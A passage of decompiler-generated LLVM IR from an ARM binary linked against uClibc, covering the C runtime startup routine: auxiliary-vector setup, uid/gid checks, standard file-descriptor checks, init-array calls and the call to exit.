  %v3_168b053 = add i32 %v2_1689c, 2012
  %v4_168b054 = inttoptr i32 %v3_168b053 to i32*
  store i32 %arg6, i32* %v4_168b054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_168ac = load i32, i32* %ip.global-to-local, align 4
  %v2_168ac = load i32, i32* @r7, align 4
  %v3_168ac = add i32 %v2_168ac, %v1_168ac
  store i32 %v3_168ac, i32* %r3.global-to-local, align 4
  %v3_168b050 = add i32 %v2_1689c, 2012
  %v4_168b051 = inttoptr i32 %v3_168b050 to i32*
  store i32 %arg6, i32* %v4_168b051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_168bc = load i32, i32* %r3.global-to-local, align 4
  %v2_168bc = load i32, i32* %r4.global-to-local, align 4
  %v3_168bc = inttoptr i32 %v2_168bc to i32*
  store i32 %v1_168bc, i32* %v3_168bc, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_168c0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_168c0, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_168c8 = bitcast i32* %stack_var_-120 to i8*
  %v4_168c8 = call i32 @__GI_memset(i8* %v3_168c8, i32 0, i32 120)
  store i32 %v4_168c8, i32* %r0.global-to-local, align 4
  %v0_168cc = load i32, i32* %r4.global-to-local, align 4
  %v1_168cc = inttoptr i32 %v0_168cc to i32*
  %v2_168cc = load i32, i32* %v1_168cc, align 4
  br label %dec_label_pc_168d8

dec_label_pc_168d8:                               ; preds = %dec_label_pc_168d8, %bb77
  %storemerge = phi i32 [ %v2_168cc, %bb77 ], [ %v1_168e4, %dec_label_pc_168d8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_168d8 = inttoptr i32 %storemerge to i32*
  %v2_168d8 = load i32, i32* %v1_168d8, align 4
  store i32 %v2_168d8, i32* %r3.global-to-local, align 4
  %v2_168dc = icmp eq i32 %v2_168d8, 0
  %v1_168e4 = add i32 %storemerge, 4
  br i1 %v2_168dc, label %dec_label_pc_168e4, label %dec_label_pc_168d8

dec_label_pc_168e4:                               ; preds = %dec_label_pc_168d8
  store i32 %v1_168e4, i32* @r4, align 4
  store i32 %v2_168c0, i32* @r5, align 4
  %v1_1690830 = inttoptr i32 %v1_168e4 to i32*
  %v2_1690831 = load i32, i32* %v1_1690830, align 4
  store i32 %v2_1690831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1690c33 = icmp eq i32 %v2_1690831, 0
  store i1 %v2_1690c33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1690c33, label %dec_label_pc_16914, label %dec_label_pc_168f0

dec_label_pc_168f0:                               ; preds = %dec_label_pc_168e4, %dec_label_pc_16908
  %v4_168f8 = phi i32 [ %v1_16904, %dec_label_pc_16908 ], [ %v1_168e4, %dec_label_pc_168e4 ]
  %v5_168f4 = phi i32 [ %v2_16908, %dec_label_pc_16908 ], [ %v2_1690831, %dec_label_pc_168e4 ]
  %v2_168f0 = icmp ugt i32 %v5_168f4, 13
  store i1 %v2_168f0, i1* %cpsr_c.global-to-local, align 1
  %v7_168f0 = icmp eq i32 %v5_168f4, 14
  store i1 %v7_168f0, i1* %cpsr_z.global-to-local, align 1
  %v2_168f4 = xor i1 %v2_168f0, true
  %v3_168f4 = or i1 %v7_168f0, %v2_168f4
  br i1 %v3_168f4, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_168f0
  %v4_168f4 = load i32, i32* @r5, align 4
  %v6_168f4 = and i32 %v5_168f4, 536870912
  %v7_168f4 = icmp ne i32 %v6_168f4, 0
  store i1 %v7_168f4, i1* %cpsr_c.global-to-local, align 1
  %v8_168f4 = mul i32 %v5_168f4, 8
  %v9_168f4 = add i32 %v4_168f4, %v8_168f4
  store i32 %v9_168f4, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_168f0, %bb78
  %v1_16900 = phi i1 [ %v2_168f0, %dec_label_pc_168f0 ], [ %v7_168f4, %bb78 ]
  %v2_168f8 = xor i1 %v1_16900, true
  %v3_168f8 = or i1 %v7_168f0, %v2_168f8
  br i1 %v3_168f8, label %bb80, label %dec_label_pc_16908

bb80:                                             ; preds = %bb79
  store i32 %v4_168f8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16908

dec_label_pc_16908:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_168f8, i32 ptrtoint (i32* @global_var_136d0.969 to i32))
  %v0_16904 = load i32, i32* @r4, align 4
  %v1_16904 = add i32 %v0_16904, 8
  store i32 %v1_16904, i32* @r4, align 4
  %v1_16908 = inttoptr i32 %v1_16904 to i32*
  %v2_16908 = load i32, i32* %v1_16908, align 4
  store i32 %v2_16908, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1690c = icmp eq i32 %v2_16908, 0
  store i1 %v2_1690c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1690c, label %dec_label_pc_16914, label %dec_label_pc_168f0

dec_label_pc_16914:                               ; preds = %dec_label_pc_16908, %dec_label_pc_168e4
  store i32 %v2_168c0, i32* %r0.global-to-local, align 4
  %v1_16918 = call i32 @_dl_aux_init(i32 %v2_168c0)
  store i32 %v1_16918, i32* %r0.global-to-local, align 4
  %v1_1691c = call i32 @__GI___uClibc_init(i32 %v1_16918)
  store i32 %v1_1691c, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_16924 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_16924, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_1692c = add i32 %v2_16924, 148
  %v3_1692c = inttoptr i32 %v2_1692c to i32*
  %v4_1692c = load i32, i32* %v3_1692c, align 4
  store i32 %v4_1692c, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16934 = icmp eq i32 %tmp66, 0
  store i1 %v2_16934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16934, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_16914
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_16914, %bb81
  %v0_16940 = phi i32 [ %tmp66, %dec_label_pc_16914 ], [ 4096, %bb81 ]
  %v3_1693c = icmp eq i32 %tmp65, -1
  store i1 %v3_1693c, i1* %cpsr_c.global-to-local, align 1
  %v8_1693c = icmp eq i32 %tmp65, -1
  store i1 %v8_1693c, i1* %cpsr_z.global-to-local, align 1
  %v2_16940 = inttoptr i32 %v4_1692c to i32*
  store i32 %v0_16940, i32* %v2_16940, align 4
  br i1 %v3_1693c, label %dec_label_pc_16948, label %dec_label_pc_16970

dec_label_pc_16948:                               ; preds = %bb82
  %v0_16948 = call i32 @getuid()
  store i32 %v0_16948, i32* @r0, align 4
  store i32 %v0_16948, i32* %r4.global-to-local, align 4
  %v0_16950 = call i32 @geteuid()
  store i32 %v0_16950, i32* @r0, align 4
  %v3_16954 = icmp uge i32 %v0_16948, %v0_16950
  store i1 %v3_16954, i1* %cpsr_c.global-to-local, align 1
  %v9_16954 = icmp eq i32 %v0_16948, %v0_16950
  store i1 %v9_16954, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16954, label %dec_label_pc_1695c, label %dec_label_pc_16998

dec_label_pc_1695c:                               ; preds = %dec_label_pc_16948
  %v1_1695c = call i32 @getgid(i32 %v0_16950)
  store i32 %v1_1695c, i32* @r0, align 4
  store i32 %v1_1695c, i32* %r4.global-to-local, align 4
  %v0_16964 = call i32 @getegid()
  store i32 %v0_16964, i32* %r0.global-to-local, align 4
  %v3_16968 = icmp uge i32 %v1_1695c, %v0_16964
  store i1 %v3_16968, i1* %cpsr_c.global-to-local, align 1
  %v9_16968 = icmp eq i32 %v1_1695c, %v0_16964
  store i1 %v9_16968, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16968, label %dec_label_pc_16970, label %dec_label_pc_16998

dec_label_pc_16970:                               ; preds = %dec_label_pc_1695c, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_1693c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_1693c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1693c, label %dec_label_pc_169c0, label %dec_label_pc_1697c

dec_label_pc_1697c:                               ; preds = %dec_label_pc_16970
  store i32 %tmp64, i32* @r3, align 4
  %v3_16980 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_16980, i1* %cpsr_c.global-to-local, align 1
  %v9_16980 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_16980, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16980, label %dec_label_pc_16988, label %dec_label_pc_16998

dec_label_pc_16988:                               ; preds = %dec_label_pc_1697c
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_16990 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_16990, i1* %cpsr_c.global-to-local, align 1
  %v9_16990 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_16990, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16990, label %dec_label_pc_169c0, label %dec_label_pc_16998

dec_label_pc_16998:                               ; preds = %dec_label_pc_1697c, %dec_label_pc_1695c, %dec_label_pc_16948, %dec_label_pc_16988
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_169a4 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_169ac = load i32, i32* @r4, align 4
  store i32 %v0_169ac, i32* %r1.global-to-local, align 4
  %v2_169b0 = call i32 @__check_one_fd(i32 1, i32 %v0_169ac)
  %v0_169b4 = load i32, i32* @r4, align 4
  store i32 %v0_169b4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_169bc = call i32 @__check_one_fd(i32 2, i32 %v0_169b4)
  store i32 %v2_169bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_169c0

dec_label_pc_169c0:                               ; preds = %dec_label_pc_16988, %dec_label_pc_16970, %dec_label_pc_16998
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v2_169c8 = load i32, i32* %arg3, align 4
  store i32 %v2_169c8, i32* %r2.global-to-local, align 4
  %v2_169cc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_169cc, i32* %r1.global-to-local, align 4
  %v3_169d0 = add i32 %v2_169cc, 260
  %v4_169d0 = inttoptr i32 %v3_169d0 to i32*
  store i32 %v2_169c8, i32* %v4_169d0, align 4
  %v0_169d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_169d4 = inttoptr i32 %v0_169d4 to i32*
  %v2_169d4 = load i32, i32* %v1_169d4, align 4
  store i32 %v2_169d4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_169d8 = icmp eq i32 %v2_169d4, 0
  store i1 %v2_169d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_169d8, label %bb84, label %dec_label_pc_169e0

dec_label_pc_169e0:                               ; preds = %dec_label_pc_169c0
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_169e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_169e4 = add i32 %v0_169e4, 164
  %v3_169e4 = inttoptr i32 %v2_169e4 to i32*
  %v4_169e4 = load i32, i32* %v3_169e4, align 4
  store i32 %v4_169e4, i32* %r3.global-to-local, align 4
  %v2_169e8 = inttoptr i32 %v4_169e4 to i32*
  store i32 %v2_169d4, i32* %v2_169e8, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_169f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_169f0 = inttoptr i32 %v0_169f0 to i32*
  %v2_169f0 = load i32, i32* %v1_169f0, align 4
  store i32 %v2_169f0, i32* %r0.global-to-local, align 4
  %v4_169f4 = call i32 @__GI_strrchr(i32 %v2_169f0, i32 47, i32 %v2_169c8, i32 %v4_169e4)
  store i32 %v4_169f4, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_169fc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_169fc, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16a00 = icmp eq i32 %v4_169f4, 0
  store i1 %v2_16a00, i1* %cpsr_z.global-to-local, align 1
  %v2_16a04 = add i32 %v2_169fc, 96
  %v3_16a04 = inttoptr i32 %v2_16a04 to i32*
  %v4_16a04 = load i32, i32* %v3_16a04, align 4
  store i32 %v4_16a04, i32* %r2.global-to-local, align 4
  br i1 %v2_16a00, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_169e0
  %v2_16a0c58 = inttoptr i32 %v4_16a04 to i32*
  store i32 0, i32* %v2_16a0c58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_169e0
  %v2_16a08 = add i32 %v4_169f4, 1
  store i32 %v2_16a08, i32* %r3.global-to-local, align 4
  %v2_16a0c = inttoptr i32 %v4_16a04 to i32*
  store i32 %v4_169f4, i32* %v2_16a0c, align 4
  %v1_16a10 = load i32, i32* %r3.global-to-local, align 4
  %v2_16a10 = load i32, i32* %r2.global-to-local, align 4
  %v3_16a10 = inttoptr i32 %v2_16a10 to i32*
  store i32 %v1_16a10, i32* %v3_16a10, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_169c0
  %v2_16a20 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_16a20, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_16a2c = add i32 %v2_16a20, -12
  store i32 %v2_16a2c, i32* %r5.global-to-local, align 4
  store i32 2008, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_16a3c = add i32 %v2_16a20, 2008
  %v4_16a3c = inttoptr i32 %v3_16a3c to i32*
  store i32 %arg5, i32* %v4_16a3c, align 4
  %v0_16a5418 = load i32, i32* %r4.global-to-local, align 4
  %v1_16a5419 = load i32, i32* %r7.global-to-local, align 4
  %v3_16a5421 = icmp uge i32 %v0_16a5418, %v1_16a5419
  store i1 %v3_16a5421, i1* %cpsr_c.global-to-local, align 1
  %v9_16a5427 = icmp eq i32 %v0_16a5418, %v1_16a5419
  store i1 %v9_16a5427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16a5421, label %dec_label_pc_16a88.lr.ph, label %dec_label_pc_16a44

dec_label_pc_16a44:                               ; preds = %bb84, %dec_label_pc_16a44
  %v1_16a44 = phi i32 [ %v1_16a50, %dec_label_pc_16a44 ], [ %v0_16a5418, %bb84 ]
  %v0_16a44 = load i32, i32* %r5.global-to-local, align 4
  %v2_16a44 = and i32 %v1_16a44, 1073741824
  %v3_16a44 = icmp ne i32 %v2_16a44, 0
  store i1 %v3_16a44, i1* %cpsr_c.global-to-local, align 1
  %v4_16a44 = mul i32 %v1_16a44, 4
  %v5_16a44 = add i32 %v4_16a44, %v0_16a44
  %v6_16a44 = inttoptr i32 %v5_16a44 to i32*
  %v7_16a44 = load i32, i32* %v6_16a44, align 4
  store i32 %v7_16a44, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_16a44)
  %v0_16a50 = load i32, i32* %r4.global-to-local, align 4
  %v1_16a50 = add i32 %v0_16a50, 1
  store i32 %v1_16a50, i32* %r4.global-to-local, align 4
  %v1_16a54 = load i32, i32* %r7.global-to-local, align 4
  %v3_16a54 = icmp uge i32 %v1_16a50, %v1_16a54
  store i1 %v3_16a54, i1* %cpsr_c.global-to-local, align 1
  %v9_16a54 = icmp eq i32 %v1_16a50, %v1_16a54
  store i1 %v9_16a54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16a54, label %dec_label_pc_16a88.lr.ph, label %dec_label_pc_16a44

dec_label_pc_16a88.lr.ph:                         ; preds = %dec_label_pc_16a44, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16a5c = icmp eq i32 %v0_168a8, 0
  store i1 %v2_16a5c, i1* %cpsr_z.global-to-local, align 1
  %v2_16a64 = xor i1 %v2_16a5c, true
  call void @__pseudo_cond_branch(i1 %v2_16a64, i32 %v0_168a8)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_16a70 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_16a7c = add i32 %v2_16a70, -12
  store i32 %v2_16a7c, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16a88

dec_label_pc_16a88:                               ; preds = %dec_label_pc_16a88.dec_label_pc_16a88_crit_edge, %dec_label_pc_16a88.lr.ph
  %v1_16a88 = phi i32 [ %v1_16a94, %dec_label_pc_16a88.dec_label_pc_16a88_crit_edge ], [ 0, %dec_label_pc_16a88.lr.ph ]
  %v0_16a88 = phi i32 [ %v0_16a88.pre, %dec_label_pc_16a88.dec_label_pc_16a88_crit_edge ], [ %v2_16a7c, %dec_label_pc_16a88.lr.ph ]
  %v2_16a88 = and i32 %v1_16a88, 1073741824
  %v3_16a88 = icmp ne i32 %v2_16a88, 0
  store i1 %v3_16a88, i1* %cpsr_c.global-to-local, align 1
  %v4_16a88 = mul i32 %v1_16a88, 4
  %v5_16a88 = add i32 %v4_16a88, %v0_16a88
  %v6_16a88 = inttoptr i32 %v5_16a88 to i32*
  %v7_16a88 = load i32, i32* %v6_16a88, align 4
  store i32 %v7_16a88, i32* %ip.global-to-local, align 4
  store i32 92820, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_16a88)
  %v0_16a94 = load i32, i32* @r4, align 4
  %v1_16a94 = add i32 %v0_16a94, 1
  store i32 %v1_16a94, i32* @r4, align 4
  %v1_16a98 = load i32, i32* @r7, align 4
  %v3_16a98 = icmp uge i32 %v1_16a94, %v1_16a98
  store i1 %v3_16a98, i1* %cpsr_c.global-to-local, align 1
  %v9_16a98 = icmp eq i32 %v1_16a94, %v1_16a98
  store i1 %v9_16a98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16a98, label %dec_label_pc_16aa0, label %dec_label_pc_16a88.dec_label_pc_16a88_crit_edge

dec_label_pc_16a88.dec_label_pc_16a88_crit_edge:  ; preds = %dec_label_pc_16a88
  %v0_16a88.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16a88

dec_label_pc_16aa0:                               ; preds = %dec_label_pc_16a88
  %v2_16aa4.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_16aa4.pre, i32* %r0.global-to-local, align 4
  %v2_16aa8 = add i32 %v2_16aa4.pre, -69120
  store i32 %v2_16aa8, i32* %r2.global-to-local, align 4
  store i32 %v2_16aa8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ab0 = icmp eq i32 %v2_16aa8, 0
  store i1 %v2_16ab0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16ab0, label %dec_label_pc_16ac8, label %dec_label_pc_16ab8

dec_label_pc_16ab8:                               ; preds = %dec_label_pc_16aa0
  store i32 92864, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_16aa8)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_16ac4 = load i32, i32* %r0.global-to-local, align 4
  %v2_16ac4 = inttoptr i32 %v1_16ac4 to i32*
  store i32 0, i32* %v2_16ac4, align 4
  %v2_16acc.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_16ac8

dec_label_pc_16ac8:                               ; preds = %dec_label_pc_16aa0, %dec_label_pc_16ab8
  %v2_16acc = phi i32 [ %v2_16aa4.pre, %dec_label_pc_16aa0 ], [ %v2_16acc.pre, %dec_label_pc_16ab8 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_16acc, i32* %r1.global-to-local, align 4
  %v2_16ad0 = add i32 %v2_16acc, 128
  %v3_16ad0 = inttoptr i32 %v2_16ad0 to i32*
  %v4_16ad0 = load i32, i32* %v3_16ad0, align 4
  store i32 %v4_16ad0, i32* %r2.global-to-local, align 4
  store i32 %v4_16ad0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ad8 = icmp eq i32 %v4_16ad0, 0
  store i1 %v2_16ad8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16ad8, label %dec_label_pc_16af0, label %dec_label_pc_16ae0

dec_label_pc_16ae0:                               ; preds = %dec_label_pc_16ac8
  store i32 92904, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16ad0)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_16aec = load i32, i32* %r0.global-to-local, align 4
  %v2_16aec = inttoptr i32 %v1_16aec to i32*
  store i32 0, i32* %v2_16aec, align 4
  br label %dec_label_pc_16af0

dec_label_pc_16af0:                               ; preds = %dec_label_pc_16ac8, %dec_label_pc_16ae0
  %v2_16af0 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_16af0, i32* @r0, align 4
  %v1_16af4 = call i32 @_setjmp(i32 %v2_16af0)
  store i32 %v1_16af4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16af8 = icmp eq i32 %v1_16af4, 0
  store i1 %v2_16af8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16af8, label %dec_label_pc_16b00, label %dec_label_pc_16b4c

dec_label_pc_16b00:                               ; preds = %dec_label_pc_16af0
  %v0_16b00 = call i32 @__aeabi_read_tp()
  store i32 %v0_16b00, i32* %r0.global-to-local, align 4
  %v1_16b04 = add i32 %v0_16b00, -1168
  store i32 %v1_16b04, i32* %r2.global-to-local, align 4
  %v2_16b0c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_16b0c, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_16b18 = add i32 %v2_16b0c, 56
  %v3_16b18 = inttoptr i32 %v2_16b18 to i32*
  %v4_16b18 = load i32, i32* %v3_16b18, align 4
  store i32 %v4_16b18, i32* %ip.global-to-local, align 4
  store i32 %v2_16af0, i32* %r3.global-to-local, align 4
  %v2_16b28 = add i32 %v0_16b00, -1040
  %v3_16b28 = inttoptr i32 %v2_16b28 to i32*
  store i32 %v2_16af0, i32* %v3_16b28, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_16b34 = load i32, i32* %ip.global-to-local, align 4
  %v1_16b34 = inttoptr i32 %v0_16b34 to i32*
  %v2_16b34 = load i32, i32* %v1_16b34, align 4
  store i32 %v2_16b34, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_16b44 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16be8

dec_label_pc_16b4c:                               ; preds = %dec_label_pc_16af0
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_16b50 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_16b50, i32* %ip.global-to-local, align 4
  %v2_16b54 = add i32 %v2_16b50, 40
  %v3_16b54 = inttoptr i32 %v2_16b54 to i32*
  %v4_16b54 = load i32, i32* %v3_16b54, align 4
  store i32 %v4_16b54, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16b54)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_16b64 = load i32, i32* %stack_var_-416, align 4
  %v2_16b68 = add i32 %v2_16b64, 120
  %v3_16b68 = inttoptr i32 %v2_16b68 to i32*
  %v4_16b68 = load i32, i32* %v3_16b68, align 4
  store i32 %v4_16b68, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16b6c

dec_label_pc_16b6c:                               ; preds = %dec_label_pc_16ba0.dec_label_pc_16b6c_crit_edge, %dec_label_pc_16b4c
  %v0_16b6c = phi i32 [ %v0_16b6c.pre, %dec_label_pc_16ba0.dec_label_pc_16b6c_crit_edge ], [ %v4_16b68, %dec_label_pc_16b4c ]
  %v1_16b6c = inttoptr i32 %v0_16b6c to i32*
  %v2_16b6c = load i32, i32* %v1_16b6c, align 4
  store i32 %v0_16b6c, i32* %r2.global-to-local, align 4
  store i32 %v2_16b6c, i32* %r4.global-to-local, align 4
  %v1_16b78 = add i32 %v2_16b6c, -1
  store i32 %v1_16b78, i32* %r1.global-to-local, align 4
  %v2_16b7c89 = load i32, i32* %v1_16b6c, align 4
  store i32 %v2_16b7c89, i32* %r3.global-to-local, align 4
  %v3_16b8091 = icmp uge i32 %v2_16b7c89, %v2_16b6c
  store i1 %v3_16b8091, i1* %cpsr_c.global-to-local, align 1
  %v9_16b8097 = icmp eq i32 %v2_16b7c89, %v2_16b6c
  store i1 %v9_16b8097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16b8097, label %dec_label_pc_16b88, label %dec_label_pc_16ba0

dec_label_pc_16b88:                               ; preds = %dec_label_pc_16b6c, %dec_label_pc_16b88.dec_label_pc_16b7c_crit_edge
  %v0_16b8898 = phi i32 [ %v1_16b80.pre, %dec_label_pc_16b88.dec_label_pc_16b7c_crit_edge ], [ %v2_16b6c, %dec_label_pc_16b6c ]
  store i32 %v0_16b8898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16b98 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16b98, label %dec_label_pc_16b9c, label %dec_label_pc_16b88.dec_label_pc_16b7c_crit_edge

dec_label_pc_16b88.dec_label_pc_16b7c_crit_edge:  ; preds = %dec_label_pc_16b88
  %v0_16b7c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16b80.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16b7c = inttoptr i32 %v0_16b7c.pre to i32*
  %v2_16b7c = load i32, i32* %v1_16b7c, align 4
  store i32 %v2_16b7c, i32* %r3.global-to-local, align 4
  %v3_16b80 = icmp uge i32 %v2_16b7c, %v1_16b80.pre
  store i1 %v3_16b80, i1* %cpsr_c.global-to-local, align 1
  %v9_16b80 = icmp eq i32 %v2_16b7c, %v1_16b80.pre
  store i1 %v9_16b80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16b80, label %dec_label_pc_16b88, label %dec_label_pc_16ba0

dec_label_pc_16b9c:                               ; preds = %dec_label_pc_16b88
  %v0_16b9c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16b9c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ba0

dec_label_pc_16ba0:                               ; preds = %dec_label_pc_16b6c, %dec_label_pc_16b88.dec_label_pc_16b7c_crit_edge, %dec_label_pc_16b9c
  %v0_16ba8 = phi i32 [ %v0_16b9c, %dec_label_pc_16b9c ], [ %v2_16b7c89, %dec_label_pc_16b6c ], [ %v2_16b7c, %dec_label_pc_16b88.dec_label_pc_16b7c_crit_edge ]
  %v1_16ba0 = phi i32 [ %v0_16b9c, %dec_label_pc_16b9c ], [ %v2_16b6c, %dec_label_pc_16b6c ], [ %v1_16b80.pre, %dec_label_pc_16b88.dec_label_pc_16b7c_crit_edge ]
  %v3_16ba0 = icmp uge i32 %v0_16ba8, %v1_16ba0
  store i1 %v3_16ba0, i1* %cpsr_c.global-to-local, align 1
  %v9_16ba0 = icmp eq i32 %v0_16ba8, %v1_16ba0
  store i1 %v9_16ba0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16ba0, label %dec_label_pc_16ba8, label %dec_label_pc_16ba0.dec_label_pc_16b6c_crit_edge

dec_label_pc_16ba0.dec_label_pc_16b6c_crit_edge:  ; preds = %dec_label_pc_16ba0
  %v0_16b6c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16b6c

dec_label_pc_16ba8:                               ; preds = %dec_label_pc_16ba0
  %v2_16ba8 = icmp ne i32 %v1_16ba0, 0
  store i1 %v2_16ba8, i1* %cpsr_c.global-to-local, align 1
  %v7_16ba8 = icmp eq i32 %v1_16ba0, 1
  store i1 %v7_16ba8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16ba8, label %dec_label_pc_16be8, label %dec_label_pc_16bb0

dec_label_pc_16bb0:                               ; preds = %dec_label_pc_16ba8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16be8

dec_label_pc_16be8:                               ; preds = %dec_label_pc_16ba8, %dec_label_pc_16bb0, %dec_label_pc_16b00
  %storemerge2 = phi i32 [ %v0_16b44, %dec_label_pc_16b00 ], [ 0, %dec_label_pc_16bb0 ], [ 0, %dec_label_pc_16ba8 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_16bec = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_16bec, i32* %r0.global-to-local, align 4
